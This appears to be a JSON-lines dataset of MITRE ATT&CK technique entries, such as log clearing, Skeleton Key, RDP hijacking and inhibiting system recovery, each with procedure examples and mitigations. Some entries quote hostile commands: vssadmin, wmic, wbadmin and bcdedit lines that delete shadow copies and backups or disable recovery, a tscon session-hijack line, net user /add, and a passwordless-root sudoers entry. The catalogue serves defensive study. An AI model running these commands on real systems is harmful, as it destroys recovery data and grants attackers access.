{"text": " Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs) * <code>/var/log/messages:</code>: General and system-related messages * <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs * <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records * <code>/var/log/kern.log</code>: Kernel logs * <code>/var/log/cron.log</code>: Crond logs * <code>/var/log/maillog</code>: Mail server logs * <code>/var/log/httpd/</code>: Web server access and error logs", "idx": "https://attack.mitre.org/techniques/T1070/002", "title": "Clear Linux or Mac System Logs", "entity": "Clear Linux or Mac System Logs", "entity_type": "techniques", "entity_context": ["Obfuscate/encrypt event files locally and in transit to avoid giving feedback to an adversary.", "Proton removes logs from <code>/var/logs</code> and <code>/Library/logs</code>.", "Rocke has cleared log files within the /var/log/ folder.", "TeamTNT has removed system logs from <code>/var/log/syslog</code>.", "Protect generated event files that are stored locally with proper permissions and authentication and limit opportunities for adversaries to increase privileges by preventing Privilege Escalation opportunities.", "Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system."], "is_subtechnique": true}
{"text": " Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.(Citation: Dell Skeleton)", "idx": "https://attack.mitre.org/techniques/T1556/001", "title": "Domain Controller Authentication", "entity": "Domain Controller Authentication", "entity_type": "techniques", "entity_context": ["Enabled features, such as Protected Process Light (PPL), for LSA.", "Chimera's malware has altered the NTLM authentication program on domain controllers to allow Chimera to login without a valid credential.\t", "Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.   These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. ", "Skeleton Key is used to patch an enterprise domain controller authentication process with a backdoor password. It allows adversaries to bypass the standard authentication system to use a defined password for all accounts authenticating to that domain controller.", "Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs. "], "is_subtechnique": true}
{"text": " Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair. In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem SSH Hijack) [SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from use of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).", "idx": "https://attack.mitre.org/techniques/T1563/001", "title": "SSH Hijacking", "entity": "SSH Hijacking", "entity_type": "techniques", "entity_context": ["Ensure proper file permissions are set and harden system to prevent root privilege escalation opportunities.", "Ensure that agent forwarding is disabled on systems that do not explicitly require this feature to prevent misuse. ", "Do not allow remote access via SSH as root or other privileged accounts.", "Ensure SSH key pairs have strong passwords and refrain from using key-store technologies such as ssh-agent unless they are properly protected."], "is_subtechnique": true}
{"text": " Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. With a sufficient level of access, the <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.", "idx": "https://attack.mitre.org/techniques/T1136/001", "title": "Local Account", "entity": "Local Account", "entity_type": "techniques", "entity_context": ["Dragonfly 2.0 created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target.", "Calisto has the capability to add its own account to the victim's machine.", "APT3 has been known to create or enable accounts, such as <code>support_388945a0</code>.", "APT39 has created accounts on multiple compromised hosts to perform actions within the network.", "ZxShell has a feature to create local user accounts.", "GoldenSpy can create new users on an infected system.\t", "Empire has a module for creating a local user if permissions allow.", "Hildegard has created a user named “monerodaemon”.", "SMOKEDHAM has created user accounts and added them to local Admin groups.", "The <code>net user username \\password</code> commands in Net can be used to create a local account.", "Pupy can user PowerView to execute “net user” commands and create local system accounts.", "Flame can create backdoor accounts with login “HelpAssistant” on domain connected systems if appropriate rights are available.", "Fox Kitten has created a local user account with administrator privileges.", "HiddenWasp creates a user account as a means to provide initial persistence to the compromised machine.", "Use multi-factor authentication for user and privileged accounts.", "Limit the usage of local administrator accounts to be used for day-to-day operations that may expose them to potential adversaries.", "Carbanak can create a Windows account.", "S-Type may create a temporary user on the system named “Lost_{Unique Identifier}” with the password “pond~!@6”{Unique Identifier}.”", "Mis-Type may create a temporary user on the system named “Lost_{Unique Identifier}.”", "ServHelper has created a new user and added it to the \"Remote Desktop Users\" and \"Administrators\" groups.", "Leafminer used a tool called Imecab to set up a persistent remote access account on the victim machine.", "TeamTNT has created local privileged users on victim machines.", "APT41 created user accounts and adds them to the User and Admin groups. "], "is_subtechnique": true}
{"text": " Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware) Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.", "idx": "https://attack.mitre.org/techniques/T1546", "title": "Event Triggered Execution", "entity": "Event Triggered Execution", "entity_type": "techniques", "entity_context": [], "is_subtechnique": false}
{"text": " Adversaries may perform sudo caching and/or use the suoders file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges. Within Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again). The sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least", "idx": "https://attack.mitre.org/techniques/T1548/003", "title": "Sudo and Sudo Caching", "entity": "Sudo and Sudo Caching", "entity_type": "techniques", "entity_context": ["Proton modifies the tty_tickets line in the sudoers file.", "Cobalt Strike can use <code>sudo</code> to run a command.", "The sudoers file should be strictly edited such that passwords are always required and that users can't spawn risky processes as users with higher privilege.", "Dok adds <code>admin  ALL=(ALL) NOPASSWD: ALL</code> to the <code>/etc/sudoers</code> file.", "By requiring a password, even if an adversary can get terminal access, they must know the password to run anything in the sudoers file. Setting the <code>timestamp_timeout</code> to 0 will require the user to input their password every time <code>sudo</code> is executed.", "Ensuring that the <code>tty_tickets</code> setting is enabled will prevent this leakage across tty sessions."], "is_subtechnique": true}
{"text": " Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items. (Citation: Startup Items) This is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), and thus the appropriate folder, <code>/Library/StartupItems</code> isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism (Citation: Methods of Mac Malware Persistence). Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.", "idx": "https://attack.mitre.org/techniques/T1037/005", "title": "Startup Items", "entity": "Startup Items", "entity_type": "techniques", "entity_context": ["jRAT can list and manage startup entries.", "Since StartupItems are deprecated, preventing all users from writing to the <code>/Library/StartupItems</code> directory would prevent any startup items from getting registered."], "is_subtechnique": true}
{"text": " Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\\windows\\system32\\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)", "idx": "https://attack.mitre.org/techniques/T1563/002", "title": "RDP Hijacking", "entity": "RDP Hijacking", "entity_type": "techniques", "entity_context": ["Consider removing the local Administrators group from the list of groups allowed to log in through RDP.", "Enable firewall rules to block RDP traffic between network security zones within a network.", "Limit remote user permissions if remote access is necessary.", "Disable the RDP service if it is unnecessary.", "Use remote desktop gateways.", "WannaCry enumerates current remote desktop sessions and tries to execute the malware on each session.", "Change GPOs to define shorter timeouts sessions and maximum amount of time any single session can be active. Change GPOs to specify the maximum amount of time that a disconnected session stays active on the RD session host server.", "Audit the Remote Desktop Users group membership regularly. Remove unnecessary accounts and groups from Remote Desktop Users groups."], "is_subtechnique": true}
{"text": " Adversaries may acquire user credentials from third-party password managers.(Citation: ise Password Manager February 2019) Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.(Citation: ise Password Manager February 2019) Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.(Citation: FoxIT Wocao December 2019)(Citation: Github KeeThief) Adversaries may extract credentials from memory via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212).(Citation: NVD CVE-2019-3610) Adversaries may also try brute forcing via [Password Guessing](https://attack.mitre.org/techniques/T1110/001) to obtain the master password of a password manager.(Citation: Cyberreason Anchor December 2019)", "idx": "https://attack.mitre.org/techniques/T1555/005", "title": "Password Managers", "entity": "Password Managers", "entity_type": "techniques", "entity_context": ["Consider re-locking password managers after a short timeout to limit the time plaintext credentials live in memory from decrypted databases.", "MarkiRAT can gather information from the Keepass password manager. ", "Fox Kitten has used scripts to access credential information from the KeePass database.", "Proton gathers credentials in files for 1password.", "Operation Wocao has accessed and collected credentials from password managers.", "TrickBot can steal passwords from the KeePass open source password manager.", "Refer to NIST guidelines when creating password policies for master passwords.", "Update password managers regularly by employing patch management for internal enterprise endpoints and servers."], "is_subtechnique": true}
{"text": " Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access. Adversaries may generate these cookies in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.(Citation: Pass The Cookie) The generation of web cookies often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values. Once forged, adversaries may use these web cookies to access resources ([Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Volexity SolarWinds)(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)", "idx": "https://attack.mitre.org/techniques/T1606/001", "title": "Web Cookies", "entity": "Web Cookies", "entity_type": "techniques", "entity_context": ["Administrators should perform an audit of all access lists and the permissions they have been granted to access web applications and services. This should be done extensively on all resources in order to establish a baseline, followed up on with periodic audits of new or updated resources. Suspicious accounts/credentials should be investigated and removed.", "Configure browsers/applications to regularly delete persistent web cookies.", "APT29 has bypassed MFA set on OWA accounts by generating a cookie value from a previously stolen secret key."], "is_subtechnique": true}
{"text": " Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to. Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).", "idx": "https://attack.mitre.org/techniques/T1591/004", "title": "Identify Roles", "entity": "Identify Roles", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) A number of native Windows utilities have been used by adversaries to disable or delete system recovery features: * <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code> * [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code> * <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code> * <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>", "idx": "https://attack.mitre.org/techniques/T1490", "title": "Inhibit System Recovery", "entity": "Inhibit System Recovery", "entity_type": "techniques", "entity_context": ["WannaCry uses <code>vssadmin</code>, <code>wbadmin</code>, <code>bcdedit</code>, and <code>wmic</code> to delete and disable operating system recovery features.", "Conficker resets system restore points and deletes backup files.", "ProLock can use vssadmin.exe to remove volume shadow copies.", "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery.", "DEATHRANSOM can delete volume shadow copies on compromised hosts.", "Clop can delete the shadow volumes with <code>vssadmin Delete Shadows /all /quiet</code> and can use bcdedit to disable recovery options.", "Babuk has the ability to delete shadow volumes using <code>vssadmin.exe delete shadows /all /quiet</code>.", "EKANS removes backups of Volume Shadow Copies to disable any restoration capabilities.", "FIVEHANDS has the ability to delete volume shadow copies on compromised hosts.", "HELLOKITTY can delete volume shadow copies on compromised hosts.", "Maze has attempted to delete the shadow volumes of infected machines, once before and once after the encryption process.", "WastedLocker can delete shadow volumes. ", "Ragnar Locker can delete volume shadow copies using <code>vssadmin delete shadows /all /quiet</code>.", "Netwalker can delete the infected system's Shadow Volumes to prevent recovery.", "Avaddon deletes backups and shadow copies using native system tools.", "JCry has been observed deleting shadow copies to ensure that data cannot be restored easily.\t", "Consider technical controls to prevent the disabling of services or deletion of files involved in system recovery. ", "RobbinHood deletes shadow copies to ensure that all the data cannot be restored easily. ", "Olympic Destroyer uses the native Windows utilities <code>vssadmin</code>, <code>wbadmin</code>, and <code>bcdedit</code> to delete and disable operating system recovery features such as the Windows backup catalog and Windows Automatic Repair.", "H1N1 disable recovery options and deletes shadow copies from the victim.", "InvisiMole can can remove all system restore points.", "Conti can delete Windows Volume Shadow Copies using <code>vssadmin</code>.", "REvil can use vssadmin to delete volume shadow copies and bcdedit to disable recovery features.", "Pysa has the functionality to delete shadow copies. ", "MegaCortex has deleted volume shadow copies using <code>vssadmin.exe</code>.", "Ryuk has used <code>vssadmin Delete Shadows /all /quiet</code> to to delete volume shadow copies and <code>vssadmin resize shadowstorage</code> to force deletion of shadow copies created by third-party applications.", "BitPaymer attempts to remove the backup shadow files from the host using <code>vssadmin.exe Delete Shadows /All /Quiet</code>."], "is_subtechnique": false}
{"text": " Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. (Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>. Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality. (Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)", "idx": "https://attack.mitre.org/techniques/T1546/007", "title": "Netsh Helper DLL", "entity": "Netsh Helper DLL", "entity_type": "techniques", "entity_context": ["netsh can be used as a persistence proxy technique to execute a helper DLL when netsh.exe is executed."], "is_subtechnique": true}
{"text": " Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources. Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk are erased instead of individual files. To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)", "idx": "https://attack.mitre.org/techniques/T1561/001", "title": "Disk Content Wipe", "entity": "Disk Content Wipe", "entity_type": "techniques", "entity_context": ["Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery.", "MegaCortex can wipe deleted data from all drives using <code>cipher.exe</code>.", "StoneDrill can wipe the accessible physical or logical drives of the infected machine.\t", "RawDisk has been used to directly access the hard disk to help overwrite arbitrarily sized portions of disk content.", "Lazarus Group has used malware like WhiskeyAlfa to overwrite the first 64MB of every drive with a mix of static and random buffers. A similar process is then used to wipe content in logical drives and, finally, attempt to wipe every byte of every sector on every drive. WhiskeyBravo can be used to overwrite the first 4.9MB of physical drives. WhiskeyDelta can overwrite the first 132MB or 1.5MB of each drive with random data from heap memory."], "is_subtechnique": true}
{"text": " Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images. Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image](https://attack.mitre.org/techniques/T1601) to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result in the network device running a modified image. (Citation: Cisco Blog Legacy Device Attacks)", "idx": "https://attack.mitre.org/techniques/T1542/005", "title": "TFTP Boot", "entity": "TFTP Boot", "entity_type": "techniques", "entity_context": ["Enable secure boot features to validate the digital signature of the boot environment and system image using a special purpose hardware device. If the validation check fails, the device will fail to boot preventing loading of unauthorized software.  ", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific protocols, such as TFTP, can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific technique used by a particular adversary or tool, and will likely be different across various network configurations. ", "Follow vendor device hardening best practices to disable unnecessary and unused features and services, avoid using default configurations and passwords, and introduce logging and auditing for detection.", "Use of Authentication, Authorization, and Accounting (AAA) systems will limit actions administrators can perform and provide a history of user actions to detect unauthorized use and abuse. TACACS+ can keep control over which commands administrators are permitted to use through the configuration of authentication and command authorization.  ", "Periodically check the integrity of the running configuration and system image to ensure they have not been modified.    ", "Restrict use of protocols without encryption or authentication mechanisms. Limit access to administrative and management interfaces from untrusted network sources. "], "is_subtechnique": true}
{"text": " Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) Adversaries may also take steps to cultivate a persona around the email account, such as through use of [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001), to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).(Citation: Mandiant APT1) To decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.(Citation: Trend Micro R980 2016)", "idx": "https://attack.mitre.org/techniques/T1585/002", "title": "Email Accounts", "entity": "Email Accounts", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.", "Sandworm Team has created email accounts that mimic legitimate organizations for its spearphishing operations.", "Magic Hound has established email accounts using fake personas for spearphishing operations.", "Leviathan has created new email accounts for targeting efforts.", "APT1 has created email accounts for later use in social engineering, phishing, and when registering domains.", "Silent Librarian has established e-mail accounts to receive e-mails forwarded from compromised accounts."], "is_subtechnique": true}
{"text": " Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. (Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect. Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges. (Citation: OSX Malware Detection).", "idx": "https://attack.mitre.org/techniques/T1543", "title": "Create or Modify System Process", "entity": "Create or Modify System Process", "entity_type": "techniques", "entity_context": ["Exaramel for Linux has a hardcoded location that it uses to achieve persistence if the startup system is Upstart or System V and it is running as root.", "Restrict software installation to trusted repositories only and be cautious of orphaned software packages.", "Limit privileges of user accounts and groups so that only authorized administrators can interact with system-level process changes and service configurations.", "Restrict read/write access to system-level process files to only select privileged users who have a legitimate need to manage system services.", "Use auditing tools capable of detecting privilege and service abuse opportunities on systems within an enterprise and correct them."], "is_subtechnique": false}
{"text": " To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network. (Citation: Onion Routing) In the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise. By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001), adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network. This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s WAN. Protocols such as ICMP may be used as a transport.", "idx": "https://attack.mitre.org/techniques/T1090/003", "title": "Multi-hop Proxy", "entity": "Multi-hop Proxy", "entity_type": "techniques", "entity_context": ["CostaRicto has used a layer of proxies to manage C2 communications.", "GreyEnergy has used Tor relays for Command and Control servers.", "Attor has used Tor for C2 communication.", "Traffic traversing the Tor network will be forwarded to multiple nodes before exiting the Tor network and continuing on to its intended destination.", "Dok downloads and installs Tor via homebrew.", "Traffic to known anonymity networks and C2 infrastructure can be blocked through the use of network allow and block lists. It should be noted that this kind of blocking may be circumvented by other techniques like Domain Fronting.", "MacSpy uses Tor for command and control.", "WannaCry uses Tor for command and control traffic.", "FIN4 has used Tor to log in to victims' email accounts.", "A backdoor used by APT29 created a Tor hidden service to forward traffic from the Tor client to local ports 3389 (RDP), 139 (Netbios), and 445 (SMB) enabling full remote access from outside the network.", "Industroyer used Tor nodes for C2.", "Dridex can use multiple layers of proxy servers to hide terminal nodes in its infrastructure.", "Siloscape uses Tor to communicate with C2.", "Leviathan has used multi-hop proxies to disguise the source of their malicious traffic.", "Keydnap uses a copy of tor2web proxy for HTTPS communications.", "APT28 has routed traffic over Tor and VPN servers to obfuscate their activities.", "Inception used chains of compromised routers to proxy C2 communications between them and cloud service providers.", "Kobalos can chain together multiple compromised machines as proxies to reach their final targets.", "Operation Wocao has executed commands through the installed web shell via Tor exit nodes.", "Ursnif has used Tor for C2.", "StrongPity can use multiple layers of proxy servers to hide terminal nodes in its infrastructure."], "is_subtechnique": true}
{"text": " Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015) Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)", "idx": "https://attack.mitre.org/techniques/T1564", "title": "Hide Artifacts", "entity": "Hide Artifacts", "entity_type": "techniques", "entity_context": ["Bundlore uses the <code>mktemp</code> utility to make unique file and directory names for payloads, such as <code>TMP_DIR=`mktemp -d -t x</code>.", "OSX/Shlayer uses the <code>mktemp</code> utility to make random and unique filenames for payloads, such as <code>export tmpDir=\"$(mktemp -d /tmp/XXXXXXXXXXXX)\"</code> or <code>mktemp -t Installer</code>."], "is_subtechnique": false}
